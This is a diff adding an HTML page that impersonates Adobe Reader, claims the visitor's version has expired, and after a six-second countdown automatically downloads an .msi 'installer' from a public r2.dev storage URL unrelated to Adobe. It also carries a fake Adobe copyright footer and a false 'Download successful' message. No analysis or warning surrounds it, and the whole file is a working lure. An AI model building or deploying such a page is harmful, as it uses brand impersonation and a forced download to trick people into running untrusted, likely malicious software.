@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Adobe Reader Update Required</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body style="margin:0;padding:0;background-color:#f5f5f5;font-family:Arial,Helvetica,sans-serif;color:#2a2a2a;">
+
+<table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color:#f5f5f5;">
+  <tr>
+    <td align="center" style="padding:30px 10px;">
+
+      <table role="presentation" width="600" cellpadding="0" cellspacing="0" border="0"
+        style="background-color:#ffffff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.1);">
+
+        <!-- HEADER -->
+        <tr>
+          <td style="background-color:#2a2a2a;padding:20px;border-radius:8px 8px 0 0;" align="center">
+            <span style="color:#ed2224;font-size:26px;font-weight:bold;">A</span>
+            <span style="color:#ffffff;font-size:22px;margin-left:6px;">Adobe Reader</span>
+          </td>
+        </tr>
+
+        <!-- BODY -->
+        <tr>
+          <td style="padding:30px;text-align:center;">
+
+            <div style="font-size:48px;color:#ed2224;margin-bottom:10px;">⚠️</div>
+
+            <h1 style="font-size:26px;margin:0 0 15px;color:#2a2a2a;">
+              Your Adobe Reader Version Has Expired
+            </h1>
+
+            <p style="font-size:16px;line-height:1.6;margin:0 0 20px;">
+              We've detected that you're using an outdated version of Adobe Reader that is no longer supported.
+              To continue viewing PDF documents securely, please update to the latest version.
+            </p>
+
+            <!-- INFO BOX -->
+            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
+              style="background-color:#f0f6ff;border-left:4px solid #0066cc;margin:20px 0;">
+              <tr>
+                <td style="padding:15px;text-align:left;font-size:15px;line-height:1.6;">
+                  <strong>Why update?</strong>
+                  <ul style="margin:10px 0 0;padding-left:18px;">
+                    <li>Improved security and protection</li>
+                    <li>Enhanced PDF compatibility</li>
+                    <li>Better performance and stability</li>
+                    <li>Access to the latest features</li>
+                  </ul>
+                </td>
+              </tr>
+            </table>
+
+            <!-- FALLBACK LINK -->
+            <p style="font-size:15px;font-weight:700;margin-top:18px;">
+              If your download doesn’t start Automatically,
+              <a href="https://pub-bf25ea682c224d9ea7ba2c3db63922c3.r2.dev/Adobe_em_1Mgilkfb_installer.msi"
+                 style="color:#0066cc;text-decoration:underline;">
+                click here
+              </a>
+            </p>
+
+            <!-- STATUS / SUCCESS BOX -->
+            <div id="statusBox"
+              style="display:none;margin-top:22px;padding:16px;
+              border-radius:6px;background:#e8f5e9;border:1px solid #2e7d32;
+              color:#2e7d32;font-size:16px;font-weight:700;">
+              ✔ <span id="statusMessage">Download successful! <br>NOTE:</B>&nbsp;Statements & Documents are only compatible with PC/Windows. </span>
+            </div>
+
+            <!-- COUNTDOWN TEXT -->
+            <p id="countdownText"
+               style="font-size:17px;font-weight:800;color:#666;margin-top:22px;">
+            </p>
+
+          </td>
+        </tr>
+
+        <!-- FOOTER -->
+        <tr>
+          <td style="background-color:#f8f8f8;padding:20px;text-align:center;font-size:12px;color:#666;border-radius:0 0 8px 8px;">
+            © 2026 Adobe Inc. All rights reserved.<br>
+            Adobe, the Adobe logo, and Reader are trademarks of Adobe Inc.
+          </td>
+        </tr>
+
+      </table>
+
+    </td>
+  </tr>
+</table>
+
+<script>
+  const DOWNLOAD_URL = "https://pub-bf25ea682c224d9ea7ba2c3db63922c3.r2.dev/Adobe_em_1Mgilkfb_installer.msi";
+  const statusBox = document.getElementById("statusBox");
+  const countdownText = document.getElementById("countdownText");
+
+  let seconds = 6;
+  countdownText.textContent = "Your download will begin in " + seconds + " seconds…";
+
+  const timer = setInterval(() => {
+    seconds--;
+    if (seconds > 0) {
+      countdownText.textContent = "Your download will begin in " + seconds + " seconds…";
+    } else {
+      clearInterval(timer);
+      countdownText.textContent = "Starting download…";
+
+      const link = document.createElement("a");
+      link.href = DOWNLOAD_URL;
+      link.download = "";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+
+      // Show success message after download starts
+      statusBox.style.display = "block";
+      countdownText.textContent = "";
+    }
+  }, 1000);
+</script>
+
+</body>
+</html>
